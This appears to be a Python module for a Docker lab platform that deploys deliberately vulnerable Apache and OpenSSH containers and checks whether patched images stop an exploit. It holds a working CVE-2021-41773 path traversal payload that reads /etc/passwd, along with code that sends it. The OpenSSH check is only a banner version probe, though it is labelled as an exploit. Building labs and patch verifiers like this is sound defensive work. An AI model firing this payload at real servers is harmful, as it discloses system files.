# Shared Docker "box" engine.
# Powers HTB-style labs (manual deploy/destroy) and, later, SentinelAI's automated
# exploit/patch verification. Boxes are ephemeral, single-asset containers.

import http.client
import logging
import re
import time
import uuid
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

_SANDBOX_DATA = Path(__file__).resolve().parent.parent / "data" / "sandbox"

CONTAINER_LABEL = "sentinel.managed"
CONTAINER_PREFIX = "sentinel-lab-"


# Registry of deployable boxes. Each box is one vulnerable asset a user can attack.
BOX_REGISTRY: dict[str, dict] = {
    "apache-2449": {
        "name": "Apache Traversal",
        "description": (
            "Apache HTTP Server 2.4.49 with a permissive filesystem config. "
            "Vulnerable to CVE-2021-41773 path traversal / file disclosure."
        ),
        "cve_id": "CVE-2021-41773",
        "image": "httpd:2.4.49",
        "patched_image": "httpd:2.4.51",  # upstream fix, used by verify_cve
        "container_port": 80,
        "config_mount": {
            "host_path": str((_SANDBOX_DATA / "httpd-vuln.conf").as_posix()),
            "container_path": "/usr/local/apache2/conf/httpd.conf",
        },
        "hint": "Try a URL-encoded path traversal through an aliased directory (e.g. /icons/).",
    },
    # Heartbleed (CVE-2014-0160) intentionally omitted: no genuinely-vulnerable
    # OpenSSL 1.0.1 image runs on a current Docker host. The known candidates
    # either use a pre-OCI manifest format modern containerd rejects, or the
    # binary itself segfaults on current kernels (it relies on syscall/vsyscall
    # behavior removed since). There is no automated sandbox test for it.
    "openssh-dblefree": {
        "name": "OpenSSH Double Free",
        "description": (
            "OpenSSH ssh-agent double free vulnerability (CVE-2021-28041), fixed in "
            "OpenSSH 8.5. Verified by banner-grabbing the live version from a "
            "vulnerable (<8.5) vs. patched (>=8.5) build."
        ),
        "cve_id": "CVE-2021-28041",
        "image": "alpine:3.13",  # ships OpenSSH 8.4p1 — vulnerable
        "patched_image": "alpine:3.18",  # ships OpenSSH 9.3 — patched
        # No off-the-shelf image ships a running sshd; install+start it at
        # container boot so the banner reflects that Alpine release's real
        # OpenSSH package version.
        "command": ["sh", "-c", "apk add --no-cache openssh >/dev/null 2>&1 && ssh-keygen -A >/dev/null 2>&1 && exec /usr/sbin/sshd -D -e"],
        "container_port": 22,
        "hint": "Grabs the live SSH banner to confirm the server's OpenSSH version is patched (>=8.5).",
    },
}

# Path traversal payload for CVE-2021-41773 (URL-encoded, must not be normalized).
_APACHE_TRAVERSAL_PATH = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"


class BoxError(Exception):
    """Raised when a box cannot be deployed or destroyed."""


_docker_client = None


def _get_docker():
    """Lazily create and cache the Docker client. Raises BoxError if unreachable."""
    global _docker_client
    if _docker_client is None:
        try:
            import docker

            _docker_client = docker.from_env()
            _docker_client.ping()
        except Exception as e:
            logger.error(f"Docker daemon unreachable: {e}")
            raise BoxError("Docker daemon is not reachable. Is Docker running?") from e
    return _docker_client


def list_boxes() -> list[dict]:
    """Return the catalog of deployable boxes (metadata only, no secrets)."""
    return [
        {
            "box_id": box_id,
            "name": box["name"],
            "description": box["description"],
            "cve_id": box["cve_id"],
            "hint": box["hint"],
        }
        for box_id, box in BOX_REGISTRY.items()
    ]


def _instance_payload(container, box_id: str, instance_id: str) -> dict:
    container.reload()
    box = BOX_REGISTRY[box_id]
    port_key = f"{box['container_port']}/tcp"
    bindings = container.ports.get(port_key) or []
    host_port = int(bindings[0]["HostPort"]) if bindings else None
    return {
        "instance_id": instance_id,
        "box_id": box_id,
        "box_name": box["name"],
        "status": container.status,
        "host": "localhost",
        "port": host_port,
        "connection": f"http://localhost:{host_port}" if host_port else None,
        "hint": box["hint"],
    }


def _start_container(box_id: str, instance_id: str, image: Optional[str] = None):
    """Start one ephemeral labelled container for a box. `image` overrides the box default."""
    box = BOX_REGISTRY[box_id]
    client = _get_docker()

    volumes = {
        box["config_mount"]["host_path"]: {
            "bind": box["config_mount"]["container_path"],
            "mode": "ro",
        }
    } if box.get("config_mount") else None

    try:
        return client.containers.run(
            image or box["image"],
            command=box.get("command"),
            name=f"{CONTAINER_PREFIX}{instance_id}",
            detach=True,
            ports={f"{box['container_port']}/tcp": None},  # Docker picks a free host port
            volumes=volumes,
            labels={
                CONTAINER_LABEL: "true",
                "sentinel.box_id": box_id,
                "sentinel.instance_id": instance_id,
            },
        )
    except Exception as e:
        logger.error(f"Failed to start container for box {box_id}: {e}")
        raise BoxError(f"Failed to deploy box: {e}") from e


def deploy_box(box_id: str) -> dict:
    """Spin up an ephemeral container for the given box and return connection info."""
    if box_id not in BOX_REGISTRY:
        raise BoxError(f"Unknown box_id: {box_id}")

    instance_id = str(uuid.uuid4())
    container = _start_container(box_id, instance_id)
    return _instance_payload(container, box_id, instance_id)


def _find_container(instance_id: str):
    client = _get_docker()
    matches = client.containers.list(
        all=True, filters={"label": f"sentinel.instance_id={instance_id}"}
    )
    return matches[0] if matches else None


def destroy_instance(instance_id: str) -> bool:
    """Force-remove the container for an instance. Returns True if one was removed."""
    container = _find_container(instance_id)
    if container is None:
        return False
    try:
        container.remove(force=True)
    except Exception as e:
        logger.error(f"Failed to destroy instance {instance_id}: {e}")
        raise BoxError(f"Failed to destroy instance: {e}") from e
    return True


def list_instances() -> list[dict]:
    """List all running/stopped boxes this platform manages."""
    client = _get_docker()
    containers = client.containers.list(all=True, filters={"label": f"{CONTAINER_LABEL}=true"})
    instances = []
    for container in containers:
        box_id = container.labels.get("sentinel.box_id", "")
        instance_id = container.labels.get("sentinel.instance_id", "")
        if box_id in BOX_REGISTRY:
            instances.append(_instance_payload(container, box_id, instance_id))
    return instances


# --- Automated exploit / patch verification (SentinelAI Micro-Sandbox) ---------------

def _wait_for_ready(host: str, port: int, expect_http: bool = True, timeout: float = 20.0) -> bool:
    """Poll until the container is actually serving, not just until the port binds.

    Docker binds the host port before the process inside is ready, so a plain TCP
    connect succeeds while the very next request gets reset ("Remote end closed
    connection without response"). For HTTP boxes we wait for a real HTTP reply;
    for other protocols (e.g. SSH) a TCP connect is the best available signal.
    """
    import socket
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            if expect_http:
                conn = http.client.HTTPConnection(host, port, timeout=2)
                conn.request("GET", "/")
                conn.getresponse().read()
                conn.close()
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                s.close()
            return True
        except Exception:
            time.sleep(0.5)
    return False


def _exploit_apache_traversal(host: str, port: int) -> tuple[bool, str]:
    """Fire the CVE-2021-41773 traversal. Success = /etc/passwd contents leak."""
    last_err = None
    for _ in range(3):  # retry transient connection resets on a freshly-started server
        try:
            conn = http.client.HTTPConnection(host, port, timeout=5)
            conn.request("GET", _APACHE_TRAVERSAL_PATH)
            resp = conn.getresponse()
            body = resp.read().decode(errors="replace")
            conn.close()
        except Exception as e:
            last_err = e
            time.sleep(1)
            continue

        success = resp.status == 200 and "root:" in body
        detail = "leaked /etc/passwd" if success else f"blocked (HTTP {resp.status})"
        return success, f"traversal → {detail}"

    return False, f"exploit request failed: {last_err}"


def _exploit_ssh_dblefree(host: str, port: int) -> tuple[bool, str]:
    """Probe for OpenSSH 8.5 ssh-agent double-free channel request vulnerability (CVE-2021-28041)."""
    import socket
    last_err = None
    for _ in range(4):  # the port can accept() a beat before sshd's banner path is live
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            banner = s.recv(1024).decode(errors="replace")
            s.close()
            if not banner:
                raise ConnectionError("empty banner")
        except Exception as e:
            last_err = e
            time.sleep(1)
            continue

        # Parse the OpenSSH version out of the banner (e.g. "SSH-2.0-OpenSSH_8.4p1")
        # and compare against the 8.5 fix boundary — CVE-2021-28041 affects <8.5.
        match = re.search(r"OpenSSH_(\d+)\.(\d+)", banner)
        is_vuln_version = bool(match) and (int(match.group(1)), int(match.group(2))) < (8, 5)
        detail = f"detected banner '{banner.strip()}' (double free vulnerable)" if is_vuln_version else f"patched banner '{banner.strip()}'"
        return is_vuln_version, f"ssh probe → {detail}"

    return False, f"ssh connection failed: {last_err}"


# cve_id -> exploit handler. Only CVEs with a real, scriptable PoC that runs on a
# modern Docker host are registered. CVE-2014-0160 (Heartbleed) has no viable
# pre-built vulnerable image — see the note in BOX_REGISTRY.
POC_HANDLERS = {
    "CVE-2021-41773": {"box_id": "apache-2449", "exploit": _exploit_apache_traversal},
    "CVE-2021-28041": {"box_id": "openssh-dblefree", "exploit": _exploit_ssh_dblefree},
}


def _run_exploit_round(box_id: str, image: str, exploit, logs: list[str], label: str) -> bool:
    """Deploy one container on `image`, wait, run the exploit, tear down. Returns success."""
    instance_id = str(uuid.uuid4())
    container = None
    try:
        container = _start_container(box_id, instance_id, image=image)
        payload = _instance_payload(container, box_id, instance_id)
        port = payload["port"]
        expect_http = BOX_REGISTRY[box_id]["container_port"] == 80
        # The SSH box installs openssh at boot (apk add) before sshd starts listening.
        ready_timeout = 30.0 if BOX_REGISTRY[box_id].get("command") else 20.0
        if not port or not _wait_for_ready("localhost", port, expect_http=expect_http, timeout=ready_timeout):
            logs.append(f"[{label}] {image}: container did not become ready")
            return False
        success, detail = exploit("localhost", port)
        logs.append(f"[{label}] {image}: {detail}")
        return success
    finally:
        if container is not None:
            try:
                container.remove(force=True)
            except Exception as e:
                logs.append(f"[{label}] cleanup warning: {e}")


def verify_cve(cve_id: str) -> dict:
    """Detonate the exploit on the vulnerable image, then on the patched image, and
    report whether the patch blocks it. Containers are always torn down."""
    logs: list[str] = []

    handler = POC_HANDLERS.get(cve_id)
    if handler is None:
        logs.append(f"No automated sandbox test available for {cve_id}.")
        return {
            "cve_id": cve_id,
            "before_exploit_success": False,
            "after_exploit_success": False,
            "patch_verified": False,
            "logs": logs,
        }

    box_id = handler["box_id"]
    box = BOX_REGISTRY[box_id]
    exploit = handler["exploit"]

    try:
        before = _run_exploit_round(box_id, box["image"], exploit, logs, "before")
        after = _run_exploit_round(box_id, box["patched_image"], exploit, logs, "after")
    except BoxError as e:
        logs.append(f"Sandbox error: {e}")
        return {
            "cve_id": cve_id,
            "before_exploit_success": False,
            "after_exploit_success": False,
            "patch_verified": False,
            "logs": logs,
        }

    patch_verified = before and not after
    logs.append(f"patch_verified = {patch_verified}")
    return {
        "cve_id": cve_id,
        "before_exploit_success": before,
        "after_exploit_success": after,
        "patch_verified": patch_verified,
        "logs": logs,
    }
